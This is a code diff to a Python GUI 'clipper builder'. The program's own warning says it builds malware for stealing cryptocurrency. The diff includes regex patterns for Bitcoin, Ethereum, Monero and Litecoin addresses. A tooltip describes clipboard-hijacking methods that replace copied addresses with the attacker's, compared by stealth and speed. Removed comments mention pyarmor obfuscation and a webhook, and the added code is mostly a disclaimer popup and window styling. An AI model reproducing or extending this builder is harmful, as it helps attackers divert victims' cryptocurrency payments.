@@ -12,9 +12,6 @@ import sys
 import re
 import os
 
-#needs pyarmor for obfuscator - pyarmor gen main.py
-#needs webhook within methdods
-
 btc_address_pattern = r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"
 eth_address_pattern = r"^(0x)?[0-9a-fA-F]{40}$"
 xmr_address_pattern = r"^4[0-9AB][0-9a-zA-Z]{93}$"
@@ -23,6 +20,48 @@ ltc_address_pattern = r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"
 customtkinter.set_appearance_mode("dark")
 
 cwd = os.getcwd()
+
+class toplevel:
+    def close():
+        hPyT.opacity.set(root, 0.999)
+        hPyT.minimize_button.enable(root)
+        top_level.destroy()
+        root.attributes('-topmost', True)
+        root.unbind("<Configure>")
+        val = dont_show_again_checkbox.get()
+        if val == "on":
+            with open("dont_show_again.txt", "w") as file:
+                file.close()
+
+    def top():
+        global top_level, dont_show_again_checkbox
+        
+        top_level = customtkinter.CTkToplevel()
+        top_level.geometry("600x300")
+        top_level.resizable(height=False, width=False)
+        top_level.attributes('-topmost', True)
+        hPyT.title_bar.hide(top_level)
+        
+        hPyT.window_frame.center_relative(root, top_level)
+        root.bind("<Configure>", lambda event: hPyT.window_frame.center_relative(root, top_level))
+
+        text_frame = customtkinter.CTkScrollableFrame(master=top_level)
+        text_frame.pack(fill="both", padx=10, pady=(18, 10))
+
+        customtkinter.CTkLabel(master=text_frame, text="coded by https://github.com/3022-2/", font=("", 15, "bold")).pack()
+        customtkinter.CTkLabel(master=text_frame, text="").pack()
+        customtkinter.CTkLabel(master=text_frame, text="DISCLAIMER: This program is intended for educational and malware analysis purposes only. Any use of this code for illegal or unethical activities is strictly prohibited. The author of this code shall not be held responsible for any misuse or damage resulting from its use. Users are solely responsible for ensuring compliance with applicable laws and ethical standards.", wraplength=500, font=("", 15, "bold")).pack()
+        customtkinter.CTkLabel(master=text_frame, text="").pack()
+        customtkinter.CTkLabel(master=text_frame, text="WARNING: THIS IS A PROGRAM DESIGNED TO BUILD MALWARE. THE MALWARE IS FOR STEALING CRYPTOCURRENCY. USE UNINSTALL GUIDE IF uninstaller.py FAILS. (not found error doesn't necessarily mean didnt uninstall)", wraplength=500, font=("", 15, "bold")).pack()
+        customtkinter.CTkLabel(master=text_frame, text="").pack()
+        customtkinter.CTkLabel(master=text_frame, text="dont forget the follow the LICENSE if you wish to distribute copies of this program", wraplength=500, font=("", 15, "bold")).pack()
+        dont_show_again_checkbox = customtkinter.CTkCheckBox(master=top_level, text="dont show this again", onvalue="on", offvalue="off")
+        dont_show_again_checkbox.pack()
+
+        close_btn = customtkinter.CTkButton(master=top_level, text="close window", command=lambda: toplevel.close())
+        close_btn.pack(pady=10)
+        exit = customtkinter.CTkButton(master=top_level, text="EXIT", fg_color="red", hover_color="#8B0000", font=("", 13, "bold"), command=lambda: sys.exit())
+        exit.pack()
 
 class resetconfig:
     def reset(btc_addr, eth_addr, xmr_addr, ltc_addr):
@@ -409,16 +448,19 @@ class buildgui:
         CTkToolTip.CTkToolTip(widget=clipper_type, message="set clipper type: all methods read and regex the clipboard for crypto addresses, then replace the address with your chosen one. the subprocess method uses Pythons subprocess, which is stealthy but may be slightly slower on some laptops. the ctypes method, also stealthy and included with Python, is fast. the pyperclip method, requiring an external installation (pip install), is fast but less stealthy. subprocess and ctypes are equally effective, while pyperclip is least recommended", delay=0.5, wraplength=300)
     
     def main():
-        global option_frame, main_frame
+        global option_frame, main_frame, root
 
         root = customtkinter.CTk()
         root.title("clipper builder by 3022-2")
         root.minsize(width=800, height=400)
         root.geometry("600x400")
         root.resizable(height=False, width=False)
-        root.iconbitmap("bitcoin__1__IY4_icon.ico")
+        root.iconbitmap("DefultIcons/racoon.ico")
 
         hPyT.rainbow_border.start(window=root, interval=5)
+        hPyT.minimize_button.disable(root)
+        hPyT.maximize_button.disable(root)
+        hPyT.opacity.set(root, 0.8)
 
         tabview = customtkinter.CTkTabview(master=root)
         tabview.pack(fill="both", expand=True, padx=5, pady=5)
@@ -436,11 +478,13 @@ class buildgui:
         customtkinter.CTkLabel(master=docs, text="""placeholder
 in the event your chosen icon doesnt bind to the .exe try restarting file explorer as for some unknown reason the icon binds but doesnt visually show it until restarting explorer                            
 if issue with icons delete icon cashe %localappdata%.
-                               """, justify="left").pack(anchor="w")
+                               """, justify="left", wraplength=750).pack(anchor="w")
 
         customtkinter.CTkButton(master=tabview.tab("documentation"), text="https://github.com/3022-2", command=lambda: webbrowser.open_new_tab("https://github.com/3022-2")).pack(fill="x", pady=(5, 0))
 
         buildgui.build_widgets()
+        if "dont_show_again.txt" not in os.listdir(cwd):
+            toplevel.top()
 
         root.mainloop()
 
